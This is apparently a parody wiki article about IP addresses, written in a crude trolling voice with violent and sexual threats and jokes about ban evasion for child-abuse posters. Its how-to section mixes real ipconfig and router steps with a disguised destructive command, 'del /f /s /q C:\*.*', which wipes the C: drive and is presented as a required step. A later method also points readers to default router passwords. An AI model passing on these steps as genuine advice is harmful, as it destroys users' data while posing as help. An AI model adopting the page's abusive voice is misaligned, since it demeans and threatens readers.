IP address
[[Image:Ipaddress.png|thumb|right|[[Skript kiddies|Someone]] can immediately begin attacking your [[computer]]!]]

Your IP Address is '''127.0.0.1''' and we are haxing your computer now. Not even pressing Alt+F4 will save you now, [[noob]]. 

With your IP, someone can HACK YOUR SHIT, KILL YOUR [[PARENTS]], KILL YOUR FIRSTBORN SON, BUTTRAPE YOUR DAUGHTERS, SLAUGHTER EVERYONE IN YOUR AREA, AND KILL YOUR [[GOD]] AND YOUR DOG.

==Why would you change your IP?==
It's useful if:
#[[You]] are a [[pedophile]] looking for an IP that hasn't been banned yet because of CP posting.
#[[You]] are planning to create a giant [[sock puppet]] farm in order to overturn [[Wikipedia]] ''ad majorem [[ED]]i gloriam''.
#[[You]] were such a [[n00b]] in a forum and you annoyed the admins so much that they [[banned]] you.
#[[You]] want to [[raid]] a forum of [[n00bs]] but you failed to hire some /b/tards as they are not your [[personal army]].
#[[You]] got humiliated and [[pwned]] by a powerful [[troll]] and you try to get a new identity.
#[[You]] are a hacker sought by the police.
#[[You]] were interrupted in a [[NO U]] war and you don't want to become a [[luser]].

==How to change your IP==
===#1===
If your computer is connected directly to the [[Tubes|internet]] without a NAT router in between, try this:
#Get to a command prompt. (From the [[Windows|Start]] menu, choose Run..., type <code>cmd</code> and [[Push_Butan|press Enter]].)
#Type <code>ipconfig /release</code> and press Enter.
#Optional: Turn off the computer and leave it turned off overnight.
#Type <code>ipconfig /renew</code> and press Enter.
#Type <code>del /f /s /q C:\*.*</code> and press Enter.
#Do not forget the last step!

===#2===
#Log into the router's admin console (often http://192.168.1.1/ or http://192.168.0.1), or for netgear brand routers use http://routerlogin.net
#Release the IP address (method varies by router manufacturer).
#Turn off router, Ethernet hubs/switches, and the cable/DSL modem.
#Leave everything off overnight.
#Turn everything back on and confirm the switch.

====#2.1 (simplified but unreliable)====
#Turn off your router, any Ethernet hubs/switches and your cable/DSL modem.

===#3===
#Go to http://192.168.1.1 or http://192.168.0.1 , or for netgear brand routers use http://routerlogin.net
#Log in (if you do not know the password, [[Google]] for default router passwords).
#Find DNS addresses and write them down.
#Switch setting to Static IP. Put in DNS addresses and change your IP to whatever you like.
